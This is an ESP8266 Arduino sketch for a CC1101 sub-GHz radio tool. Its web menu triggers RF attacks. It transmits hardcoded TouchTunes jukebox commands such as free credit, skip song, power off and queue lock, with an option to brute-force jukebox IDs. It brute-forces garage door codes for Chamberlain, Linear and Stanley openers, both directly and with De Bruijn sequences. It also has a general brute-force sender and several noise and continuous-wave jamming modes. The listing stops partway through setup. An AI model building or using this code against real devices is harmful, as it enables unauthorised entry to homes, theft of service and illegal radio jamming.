#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
//#include <cc1101_debug_service.h>


/* Put your SSID & Password */
//const char* ssid = "RFmoggy";  // Enter SSID here
//const char* password = "diymoggy";  //Enter Password here

/* Put IP Address details */
//IPAddress local_ip(192,168,1,1);
//IPAddress gateway(192,168,1,1);
//IPAddress subnet(255,255,255,0); 

/* Wifi Client mode */
const char* ssid = "yourWifiNetwork";  // Enter SSID here
const char* password = "yourWifiPassword";  //Enter Password here



ESP8266WebServer server(80);   //instantiate server at port 80 (http port)

int gdo0;
byte bytesToSend[1036];
byte sendPacket[60];

//I was too lazy to write a de bruijn generator. Generated de bruijn sequences from https://damip.net/article-de-bruijn-sequence
String debruijn_ten = "0000000000100000000110000000101000000011100000010010000001011000000110100000011110000010001000001001100000101010000010111000001100100000110110000011101000001111100001000010001100001001010000100111000010100100001010110000101101000010111100001100010000110011000011010100001101110000111001000011101100001111010000111111000100010100010001110001001001000100101100010011010001001111000101001100010101010001010111000101100100010110110001011101000101111100011000110010100011001110001101001000110101100011011010001101111000111001100011101010001110111000111100100011110110001111101000111111100100100110010010101001001011100100110110010011101001001111100101001010011100101010110010101101001010111100101100110010110101001011011100101110110010111101001011111100110011010011001111001101010100110101110011011011001101110100110111110011100111010110011101101001110111100111101010011110111001111101100111111010011111111010101010111010101101101010111110101101011011110101110111010111101101011111110110110111011011111101110111110111101111111111000000000";
String debruijn_nine = "0000000001000000011000000101000000111000001001000001011000001101000001111000010001000010011000010101000010111000011001000011011000011101000011111000100011000100101000100111000101001000101011000101101000101111000110011000110101000110111000111001000111011000111101000111111001001001011001001101001001111001010011001010101001010111001011011001011101001011111001100111001101011001101101001101111001110101001110111001111011001111101001111111010101011010101111010110111010111011010111111011011011111011101111011111111100000000";
String debruijn_eight = "00000000100000011000001010000011100001001000010110000110100001111000100010011000101010001011100011001000110110001110100011111001001010010011100101011001011010010111100110011010100110111001110110011110100111111010101011101011011010111110110111101110111111110000000";
String noisy_packet = "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111";

//Other Touchtunes codes are listed in Havoc Firmware https://github.com/furrtek/portapack-havoc/blob/master/firmware/application/apps/ui_touchtunes.hpp
String jukebox_pwm_prefix = "11111111111111110000000010100010100010001000101000";  //preamble sync and vendor ID x5D converted to PWM. NEC Infrared Protocol
String jukebox_pwm_freeCredit = "10100010001000101010101000101010100010001000100010"; //x70 and inverse, converted to PWM format: 0=10 1=1000. Signal ends with EOT pulse (10)
String jukebox_pwm_pauseSong = "10101000100010101000101000100010101000100010100010"; //x32 
String jukebox_pwm_skipSong = "10001000101010001010001010101000100010100010100010";  //xCA
String jukebox_pwm_volumeUp = "10001000101000101010101010100010100010001000100010";  //xD0 this for zone1. most jukebox have multiple zones e.g. patio, indoor, etc.
String jukebox_pwm_volumeDown = "10100010100010101010100010100010100010001000100010"; //x50
String jukebox_pwm_powerOff = "10100010001000100010101010001010101010001000100010"; //x78
String jukebox_pwm_lockQueue = "10100010100010001010101000101000101010001000100010"; //0x58

String menu_htmlHeader;
String main_menu = "";
String jukebox_menu = "";
String garage_menu = "";
String debruijn_menu = "";
String rfpwnon_menu = "";
String noise_menu = "";
String widenoise_menu = "";
String cwavenoise_menu = "";


void handle_NotFound(){
  server.send(404, "text/plain", "Not found");
}

void handleMainMenu() {
 Serial.println("User called the main menu");
 //String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", main_menu); //Send web page
}

void handleJukeboxMenu(){
  Serial.println("User called the jukebox menu");
  server.send(200, "text/html", jukebox_menu);
}

void handleGarageMenu(){
  Serial.println("User called the garage door menu");
  server.send(200, "text/html", garage_menu);
}

void handleDebruijnMenu(){
  Serial.println("User called the De Bruijn menu");
  server.send(200, "text/html", debruijn_menu);
}

void handleRfpwnonMenu(){
  Serial.println("User called the Rfpwnon menu");
  server.send(200, "text/html", rfpwnon_menu);
}

void handleNoiseMenu(){
  Serial.println("User called the Noise menu");
  server.send(200, "text/html", noise_menu);
}

void handleWideNoiseMenu(){
  Serial.println("User called the Wide Noise menu");
  server.send(200, "text/html", widenoise_menu);
}

void handleCwaveNoiseMenu(){
  Serial.println("User called the CW Noise menu");
  server.send(200, "text/html", cwavenoise_menu);
}



void handleJukeboxSend() {  
  String button = server.arg("remotebutton");
  int bruteSize = 0;
  String jukeboxID;
  int repeatX = server.arg("jukeboxRepeat").toInt();
  
  if( server.arg("brutejuke").equals("true") ){ bruteSize = 8; jukeboxID = jukebox_pwm_prefix; }
  else{ jukeboxID = jukebox_pwm_prefix + "1010101010101010"; }  //default jukebox ID of 0x00 PWM. Most jukeboxes use the default

  Serial.println(); Serial.print("TX: Jukebox "); Serial.println(button);
  
  if( server.arg("remotebutton").equals("freeCredit") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_freeCredit, false, 2, 0); }
  if( server.arg("remotebutton").equals("pauseSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_pauseSong, false, 2, 0); }
  if( server.arg("remotebutton").equals("skipSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_skipSong, false, 2, 0); }
  if( server.arg("remotebutton").equals("volumeUp") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_volumeUp, false, 2, 0); }
  if( server.arg("remotebutton").equals("volumeDown") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_volumeDown, false, 2, 0); }
  if( server.arg("remotebutton").equals("powerOff") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_powerOff, false, 2, 0); }
  if( server.arg("remotebutton").equals("lockQueue") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, repeatX, 40000, 500, jukeboxID, false, jukebox_pwm_lockQueue, false, 2, 0); }

  Serial.print("EOTX: Jukebox "); Serial.println(button); Serial.println();
 
  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"jukebox\">Return to Jukebox Menu</a></p></body></html>");
}


void handleGarageSend() {  
  
  if( server.arg("chamber7").equals("true") ){ 
    Serial.println(); Serial.println("TX: Chamberlain7 Brute");
    binaryBruteSend(7, "0111", "0011", 390, 1.0, 7, 40000, 100, "", false, "", false, 2, 0);
    Serial.println("EOTX: Chamberlain7 Brute"); Serial.println();
  }
  if( server.arg("linear8").equals("true") ){
    Serial.println(); Serial.println("TX: Linear8 Brute");
    binaryBruteSend(8, "10000000", "11110000", 310, 2.0, 7, 40000, 100,  "", false, "", false, 2, 0);
    Serial.println("EOTX: Linear8 Brute"); Serial.println();
  }
  if( server.arg("chamber8").equals("true") ){
    Serial.println(); Serial.println("TX: Chamberlain8 Brute");
    binaryBruteSend(8, "0111", "0011", 390, 1.0, 7, 40000, 100, "", false, "", false, 2, 0); 
    Serial.println("EOTX: Chamberlain8 Brute"); Serial.println();
  }
  if( server.arg("chamber9").equals("true") ){
    Serial.println(); Serial.println("TX: Chamberlain9 Brute");
    binaryBruteSend(9, "0111", "0011", 390, 1.0, 7, 40000, 100,  "", false, "", false, 2, 0);
    Serial.println("EOTX: Chamberlain9 Brute"); Serial.println();
  }
  if( server.arg("stanley10").equals("true") ){
    Serial.println(); Serial.println("TX: Stanley10 Brute");
    binaryBruteSend(10, "1000", "1110", 310, 2.0, 7, 40000, 100,  "", false, "", false, 2, 0);
    Serial.println("EOTX: Stanley10 Brute"); Serial.println();
  } 
  if( server.arg("linear10").equals("true") ){
    Serial.println(); Serial.println("TX: Linear10 Brute");
    binaryBruteSend(10, "1000", "1110", 300, 2.0, 8, 18000, 100,  "", false, "", false, 2, 0);
    Serial.println("EOTX: Linear10 Brute"); Serial.println();
  }

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"garage\">Return to Garage Menu</a></p></body></html>");
}

void handleDebruijnSend(){
  int repeatDebru = server.arg("deBruijnRepeat").toInt();

  if( server.arg("linearDebruijn").equals("true") ){
    Serial.println(); Serial.println("TX: Linear10 DeBruijn");
    binaryBruteSend(0, "1000", "1110", 300, 2.0, repeatDebru, 100000, 200,  "", false, debruijn_ten, true, 2, 0);
    Serial.println("EOTX: Linear10 DeBruijn"); Serial.println();
  }
  if( server.arg("stanleyDebruijn").equals("true") ){
    Serial.println(); Serial.println("TX: Stanley10 DeBruijn");
    binaryBruteSend(0, "1000", "1110", 310, 2.0, repeatDebru, 100000, 200,  "", false, debruijn_ten, true, 2, 0);
    Serial.println("EOTX: Stanley10 DeBruijn"); Serial.println();
  }
  if( server.arg("chamberDebruijn").equals("true") ){
    Serial.println(); Serial.println("TX: Chamberlain789 DeBruijn");
    binaryBruteSend(0, "0111", "0011", 390, 1.0, repeatDebru, 100000, 200,  "", false, debruijn_nine, true, 2, 0);
    Serial.println("EOTX: Chamberlain789 DeBruijn"); Serial.println();
  }
  if( server.arg("mooreDebruijn").equals("true") ){
    Serial.println(); Serial.println("TX: Linear8 DeBruijn");
    binaryBruteSend(0, "10000000", "11110000", 310, 2.0, repeatDebru, 100000, 200,  "", false, debruijn_eight, true, 2, 0);
    Serial.println("EOTX: Linear8 DeBruijn"); Serial.println();
  }

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"debruijn\">Return to DeBruijn Menu</a></p></body></html>");
}

void handleRfpwnonSend(){
  //add error checking & ranges/bounds!!!
  float _mhz = server.arg("pwnMHz").toFloat();
  float _baud = server.arg("pwnBaud").toFloat();
  int _dipsize = server.arg("pwnDipSize").toInt();
  int _repeatdip = server.arg("pwnRepeat").toInt();
  int _gapwidth = server.arg("pwnGapWidth").toInt();
  int _attemptwait = server.arg("pwnAttemptWait").toInt();
  String _zeropwm = server.arg("pwnZeroPwm");
  String _onepwm = server.arg("pwnOnePwm");
  String _prefixbinary = server.arg("pwnPrefix");
  String _postfixbinary = server.arg("pwnPostfix");
  bool _convertpref; bool _convertpostf;
  if( server.arg("pwnConverPrefix").equals("true") ){ _convertpref = true; }
  else{ _convertpref = false; }
  if( server.arg("pwnConvertPostfix").equals("true") ){ _convertpostf = true; }
  else{ _convertpostf = false; }

  Serial.println(); Serial.println("TX: RfPwnOn Signal");

  binaryBruteSend(_dipsize, _zeropwm, _onepwm, _mhz, _baud, _repeatdip, _gapwidth, _attemptwait,
                  _prefixbinary, _convertpref, _postfixbinary, _convertpostf, 2, 0);

  Serial.println("EOTX: RfPwnOn Signal"); Serial.println();

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"rfpwnon\">Return to RfPwnOn Menu</a></p>");
}

void handleNoiseSend(){
  float noisyMHz = server.arg("noiseMHz").toFloat();
  float noisyRate = server.arg("noiseRate").toFloat();
  float noisyDevn = server.arg("noiseDevn").toFloat();
  int noisyModu = server.arg("noiseModu").toInt();
  int noisyTime = server.arg("noiseTime").toInt();
  //at 2kbps we can send about 250bytes per second. 50bytes per packet = 5 packets (repeats) per second
  float onePacketTime = 248 / (noisyRate * 1000);
  int repeatNoisy = noisyTime / onePacketTime;
  Serial.print("Times repeating the noisy packet: "); Serial.println(repeatNoisy);
  //int repeatNoisy = noisyTime * 5;

  Serial.println(); Serial.println("TX: Noise Signal");
  binaryBruteSend(0, "0", "1", noisyMHz, noisyRate, repeatNoisy, 1000, 1,  "", false, noisy_packet, false, noisyModu, noisyDevn);  
  Serial.println("EOTX: Noise Signal"); Serial.println();

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"noise\">Return to Noise Menu</a></p>");
}

void handleWideNoiseSend(){
  uint8_t chipstate;
  float widenoisyMHz = server.arg("widenoiseMHz").toFloat();
  unsigned int widenoisyBandwidth = server.arg("widenoiseBandwidth").toInt();
  unsigned long widenoisyDuration = server.arg("widenoiseDuration").toInt();

  pinMode(gdo0, OUTPUT);
  ELECHOUSE_cc1101.setMHZ(widenoisyMHz);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setPA(12);
  //ELECHOUSE_cc1101.setDeviation(2.0);
  ELECHOUSE_cc1101.setDRate(2.0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  chipstate = 0xFF;
  while(chipstate != 0x13){ chipstate = (ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F); }


  Serial.println(); Serial.println("TX: Noise Signal");
  digitalWrite(LED_BUILTIN, LOW);  
  tone(gdo0, widenoisyBandwidth);
  
  delay(widenoisyDuration);
  noTone(gdo0);
  digitalWrite(LED_BUILTIN, HIGH);
  
  Serial.println("EOTX: Noise Signal"); Serial.println();
  
  ELECHOUSE_cc1101.setSidle();
  while(chipstate != 0x01){ chipstate = (ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F); }
  ELECHOUSE_cc1101.setGDO0(gdo0);
  ELECHOUSE_cc1101.setPktFormat(0);

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"widenoise\">Return to Wide Noise Menu</a></p>");

}
void handleCwaveNoiseSend(){
  uint8_t chipstate;
  float cwavenoisyMHz = server.arg("cwavenoiseMHz").toFloat();
  //unsigned int cwavenoisyBandwidth = server.arg("widenoiseBandwidth").toInt();
  unsigned long cwavenoisyDuration = server.arg("cwavenoiseDuration").toInt();

  pinMode(gdo0, OUTPUT);
  ELECHOUSE_cc1101.setMHZ(cwavenoisyMHz);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setPA(12);
  //ELECHOUSE_cc1101.setDeviation(2.0);
  ELECHOUSE_cc1101.setDRate(1.0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  chipstate = 0xFF;
  while(chipstate != 0x13){ chipstate = (ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F); }


  Serial.println(); Serial.println("TX: Noise Signal");
  digitalWrite(LED_BUILTIN, LOW);   
  digitalWrite(gdo0, HIGH);
  delay(cwavenoisyDuration); 
  digitalWrite(LED_BUILTIN, HIGH);
  digitalWrite(gdo0, LOW);
  
  Serial.println("EOTX: Noise Signal"); Serial.println();
  
  ELECHOUSE_cc1101.setSidle();
  while(chipstate != 0x01){ chipstate = (ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F); }
  ELECHOUSE_cc1101.setGDO0(gdo0);
  ELECHOUSE_cc1101.setPktFormat(0);

  server.send(200, "text/html", menu_htmlHeader + "<h1>Signal is sent</h1><p><a href=\"/\">Return to Main Menu</a></p><p><a href=\"cwavenoise\">Return to CW Noise Menu</a></p>");

}




//input dip switch size, PWM code for "0" and "1", frequency, datarate, repeatTimes, gap inside packet (microseconds), gap between repeats/packets (milliseconds)
void binaryBruteSend(int dipSize, String zero_pwm, String one_pwm, float freqmhz, float baud, int pulseReps, int gapWidth, 
                     int attemptPause, String prefixBinary, bool convertPrefix, String postfixBinary, bool convertPostfix, byte modulate, float devn){
                      
  String firstBinary;
  String pwmBinary;
  String subBinary;
  int missing;
  int i;
  int counter;
  int numOfBytes;
  int sendSections;
  int leftoverBytesSize;
  int subSecStart;
  int pktLength;
  int highestDIP;
  uint8_t chipstate;

  ELECHOUSE_cc1101.setModulation(modulate);
  ELECHOUSE_cc1101.setDeviation(devn);
  ELECHOUSE_cc1101.setMHZ(freqmhz);
  ELECHOUSE_cc1101.setDRate(baud);
  ELECHOUSE_cc1101.setPA(12);
 
  highestDIP = pow(2, dipSize); //sets the number of combinations to try
  for(int x = 0; x < highestDIP; x++){
    firstBinary = String(x, BIN);
    pwmBinary = "";
    subBinary = "";
      
    //pad binary with zeroes to match DIP size
    if( firstBinary.length() < dipSize ){
      missing = dipSize - firstBinary.length();
      for(int y = 0; y < missing; y++){ firstBinary = "0" + firstBinary; }
    }
    Serial.print("Binary data: "); Serial.println(firstBinary);

    //convert pulses to PWM
    if( dipSize > 0 ){ pwmBinary = convertToPWM(firstBinary, zero_pwm, one_pwm); }

    //add prefix bits and postfix bits to signal. convert to pwm if user indicates
    if( prefixBinary.length() > 0 && convertPrefix == true ){ pwmBinary = convertToPWM(prefixBinary, zero_pwm, one_pwm) + pwmBinary; }
    else{ pwmBinary = prefixBinary + pwmBinary; }
    
    if( postfixBinary.length() > 0 && convertPostfix == true ){ pwmBinary = pwmBinary + convertToPWM(postfixBinary, zero_pwm, one_pwm); }
    else{ pwmBinary = pwmBinary + postfixBinary; }
    
    //convert pwm binary string to byte array
    //parse String into 8 character substrings; convert substrings from String binary to int
    //pad pwm string with trailing zeroes so it can be divided into FULL bytes = string length mod 8 should equal 0
    //must pad with zeroes on right side, or else compiler pads on the left and it gives incorrect byte
    counter = 0;
    if( pwmBinary.length() % 8 > 0 ){
      counter = 8 - (pwmBinary.length() % 8);
      for( int m = 0; m < counter; m++ ){ pwmBinary = pwmBinary + "0"; }
    }
       
    numOfBytes = pwmBinary.length() / 8;
    for(int i = 0; i < numOfBytes; i++){
      subBinary = pwmBinary.substring( (i * 8), (((i + 1) * 8) )); //substring excludes last indexed character. Very confusing
      bytesToSend[i] = convertBinStrToInt( subBinary );      
    }

    
    Serial.print("Number of bytes to send: "); Serial.println(numOfBytes);
    Serial.print("Hex of data: "); for( int y = 0; y < numOfBytes; y++){ Serial.print(" 0x");Serial.print(bytesToSend[y], HEX); };
    Serial.println();
    //ELECHOUSE_cc1101.flushTxFifo();
    //ELECHOUSE_cc1101.WaitForIdle();
    //ELECHOUSE_cc1101.FlushTxFifo();
    digitalWrite(LED_BUILTIN, LOW);

    
    for( int k = 0; k <= pulseReps; k++ ){
      ELECHOUSE_cc1101.SpiWriteBurstReg(CC1101_TXFIFO, bytesToSend, 60); //fill up TX FIFO before starting transmit. FIFO is 64bytes, but I only fill to 60. If packet is smaller than 60,
                                                                         //any extra bytes will be flushed from TX FIFO array after transmission
      if( numOfBytes < 256 ){
        ELECHOUSE_cc1101.setPacketLength(numOfBytes);
        ELECHOUSE_cc1101.SetTx(); //starting transmitting bytes
        
        for( int x = 60; x < numOfBytes; x++){
          while(digitalRead(gdo0)); //wait for the TX FIFO to be below 61 bytes, then we can start adding more bytes. GDOx_CFG = 0x02 page 62 datasheet
          ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, bytesToSend[x]);
          yield();
        }
        
      }else{
        //debrujin & long sequence transmission is work in progress
        //Texas Instruments document DN500 describes large packet transmissions 
        ELECHOUSE_cc1101.setPacketLength( 4 );  //the FIFO threshold value. If you change FIFOTHR, you must change this length value
        //ELECHOUSE_cc1101.SpiWriteReg(CC1101_PKTCTRL0, 2); //Set to infinite packet mode
        ELECHOUSE_cc1101.setLengthConfig(2); //set to infinite length packet mode
        //Serial.println("starting debruijn transmit");
        //Serial.print("TX FIFO size:" ); Serial.println( ELECHOUSE_cc1101.SpiReadStatus(CC1101_TXBYTES), HEX);
        ELECHOUSE_cc1101.SetTx(); //starting transmitting bytes
        //Serial.println("transmit started");
      
        for(int x = 60; x < numOfBytes; x++){
          while(digitalRead(gdo0));
          ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, bytesToSend[x]);
          yield();
        }
        
        while(digitalRead(gdo0)); //once GDO0 de-asserts, only 4 bytes should be left to be transmitted      
        //ELECHOUSE_cc1101.SpiWriteReg(CC1101_PKTCTRL0, 0); //Set to fixed packet mode
        ELECHOUSE_cc1101.setLengthConfig(0); //set to fixed packet mode
      }

      
      yield();
      chipstate = 0xFF;
      while(chipstate != 0x01){ chipstate = (ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F); }
      //ELECHOUSE_cc1101.WaitForIdle(); //chip is programmed to goto idle after transmit (page 28,81 in datasheet. MCSM1 register). Wait for idle in case transmission is slower than code execution??
      //can only flush FIFO when chip is IDLE or in UNDERFLOW state
      //Serial.println("flushing tx fifo");
      
      if( ELECHOUSE_cc1101.SpiReadStatus(CC1101_TXBYTES) > 0 ){ ELECHOUSE_cc1101.SpiStrobe(CC1101_SFTX); }
      //ELECHOUSE_cc1101.FlushTxFifo(); ///flush tx fifo in case extra bytes 
      //yield();
      //ELECHOUSE_cc1101.WaitForIdle();
      delayMicroseconds(gapWidth);
    }
    
    memset(bytesToSend, 0, 1036);
   
    digitalWrite(LED_BUILTIN, HIGH);
    delay(attemptPause);
  }
}


String convertToPWM(String bulkBinary, String zeroPwm, String onePwm){
  String refinedBinary = "";
  for(int y = 0; y < bulkBinary.length(); y++){
      if( bulkBinary[y] == '0' ){ refinedBinary += zeroPwm; }
      else{ refinedBinary += onePwm; }
    }
  return refinedBinary;
}

int convertBinStrToInt(String binaryString){  //could use bitWrite instead
  int value = 0;
  for(int z = 0; z < binaryString.length(); z++){
      value *= 2;
      if( binaryString[z] == '1' ){ value++; }
  }
  return value;
}


void setup(void){

  Serial.begin(115200);

  //Setup CC1101 Radio
  gdo0 = 5; //for esp8266 gdo0 on pin 5 = D1

  ELECHOUSE_cc1101.Init();  
  ELECHOUSE_cc1101.setGDO0(gdo0);  //set gdo0 pinMode to INPUT
  
  ELECHOUSE_cc1101.setSyncMode(0); //turn off preamble/sync
  ELECHOUSE_cc1101.setDcFilterOff(false);  //MDMCFG2 DC filter enabled
  ELECHOUSE_cc1101.setManchester(false);  //MDMCFG2 Manchester Encoding off
  
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x03); //Sets how GDO0 will assert based on size of FIFO bytes (pages 62, 71 in datasheet)
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FIFOTHR, 0x00); //FIFO threshold; sets how many bytes TX & RX FIFO holds (pages 56, 72 in datasheet)
  
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG1, 0x03);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG2, 0x03);
 
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_PKTCTRL0, 0x00); //Use FIFO, no whitening, no CRC, Fixed Packet length
  ELECHOUSE_cc1101.setWhiteData(false); //PKTCTRL0 data whitening off
  ELECHOUSE_cc1101.setPktFormat(0); //PKTCTRL0 use FIFO for TX and RX
  ELECHOUSE_cc1101.setCrc(false); //PKTCTRL0 CRC disabled
  ELECHOUSE_cc1101.setLengthConfig(0); //PKTCTRL0 Fixed packet length. Use PKTLEN register to set packet length
  
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_MDMCFG1,  0x02); //2 preamble bytes (least amount)
  ELECHOUSE_cc1101.setFEC(false); //MDMCFG1 Forward error correction disabled
  ELECHOUSE_cc1101.setPRE(0x00);  //MDMCFG1 Minimum number of preamble bytes
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_MDMCFG0,  0xF8); //channel spacing. Irrelevant for rfmoggy
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_CHANNR,   0x00); //channel 0. Only relevant when communicating with another CC1101
  ELECHOUSE_cc1101.setChsp(12.5); //MDMCFG0 channel spacing kHz
  ELECHOUSE_cc1101.setChannel(0x00); //CHANNR sets channel number. channel 0 stays on base frequency
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_DEVIATN,  0x00); //irrelevant in ASK OOK mode
  ELECHOUSE_cc1101.setDeviation(0);
  
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FREND1,   0x56); 
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_MCSM0 ,   0x18);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FOCCFG,   0x14);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_BSCFG,    0x6C);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_AGCCTRL2, 0x07); //Texas Instrument document DN022 describes optimum settings for ASK reception
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_AGCCTRL1, 0x00);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_AGCCTRL0, 0x92);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSCAL3,   0xE9);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSCAL2,   0x2A);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSCAL1,   0x00);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSCAL0,   0x1F);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSTEST,   0x59);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_TEST2,    0x81);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_TEST1,    0x35);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_TEST0,    0x09);
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_PKTCTRL1, 0x00);
  ELECHOUSE_cc1101.setPQT(0); //PKTCTRL1 Preamble quality estimator disabled
  ELECHOUSE_cc1101.setCRC_AF(false); //PKTCTRL1 Disable automatic flush of RX FIFO if CRC is not OK
  ELECHOUSE_cc1101.setAppendStatus(false); //PKTCTRL1 Status bytes (RSSI and LQI values) appeneded to payload is disabled
  ELECHOUSE_cc1101.setAdrChk(0); //PKTCTRL1 No address check
  
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_ADDR,     0x00);
  ELECHOUSE_cc1101.setAddr(0);
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_PKTLEN,   0x3D); //max packet size of 256. Related to TX FIFO buffer and FIFOTHR, include length & address byte(s) if enabled
  ELECHOUSE_cc1101.setPacketLength(0x3D);

  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_SYNC1, 0x00);
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_SYNC0, 0x00);
  ELECHOUSE_cc1101.setSyncWord(0x00, 0x00); //SYNC0 and SYNC1 sync words
  //ELECHOUSE_cc1101.SpiWriteReg(CC1101_FSCTRL0, 0x00); //if you have a cheaper chip, you will need to adjust this, frequency offset
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_MCSM2, 0x07);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_MCSM1, 0x00); //goto idle after TX
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_WOREVT1, 0x87);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_WOREVT0, 0x6B);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_WORCTRL, 0xFB);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_RCCTRL1, 0x41);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_RCCTRL0, 0x00);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_PTEST, 0x7F);
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_AGCTEST, 0x3F);
  

  //These values come from LSatan Calibration tool. RTLSDR required. https://github.com/LSatan/CC1101-Debug-Service-Tool/tree/master/Calibrate_frequency
  //setClb must be called before setMHz is called the first time
  ELECHOUSE_cc1101.setClb(1,11,12); //big bread board
  ELECHOUSE_cc1101.setClb(2,13,16);
  ELECHOUSE_cc1101.setClb(3,26,30);
  ELECHOUSE_cc1101.setClb(4,31,31);
  
  //ELECHOUSE_cc1101.setClb(1,16,18); //green case
  //ELECHOUSE_cc1101.setClb(2,20,24);
  //ELECHOUSE_cc1101.setClb(3,40,46);
  //ELECHOUSE_cc1101.setClb(4,46,47);

  //ELECHOUSE_cc1101.setClb(1,12,14); //case3 karver
  //ELECHOUSE_cc1101.setClb(2,15,18);
  //ELECHOUSE_cc1101.setClb(3,32,36);
  //ELECHOUSE_cc1101.setClb(4,37,38);

  //ELECHOUSE_cc1101.setClb(1,12,14); //case4 oma_scanner
  //ELECHOUSE_cc1101.setClb(2,15,19);
  //ELECHOUSE_cc1101.setClb(3,32,36);
  //ELECHOUSE_cc1101.setClb(4,37,38);
  
  //ELECHOUSE_cc1101.setCCMode(0);  //any value besides 1
  //ELECHOUSE_cc1101.setModulation(2); //modulation is ASK by default
  ELECHOUSE_cc1101.setMHZ(433.92);
  //ELECHOUSE_cc1101.set_rxbw(100);
  ELECHOUSE_cc1101.setDRate(1.777);
  //ELECHOUSE_cc1101.setIdle();
  //ELECHOUSE_cc1101.setPA(12); 


//wifi client mode
/*************************************************************************/

  WiFi.mode(WIFI_STA); //ESP8266 will transmit most recent AP SSID without this line
  WiFi.begin(ssid, password);     //Connect to your WiFi router
  Serial.println("");

  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
 
  //If connection successful show IP address in serial monitor
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());  //IP address assigned to your ESP */

/*************************************************************************/



//wifi host mode
/*************************************************************************/
  //WiFi.mode(WIFI_AP);
  //WiFi.softAP(ssid, password, 11);
  //WiFi.softAPConfig(local_ip, gateway, subnet);
 // delay(100);
/*************************************************************************/
  
  server.on("/", handleMainMenu);      //Which routine to handle at root location. This is display page
  server.on("/jukebox", handleJukeboxMenu);
  server.on("/garage", handleGarageMenu);
  server.on("/debruijn", handleDebruijnMenu);
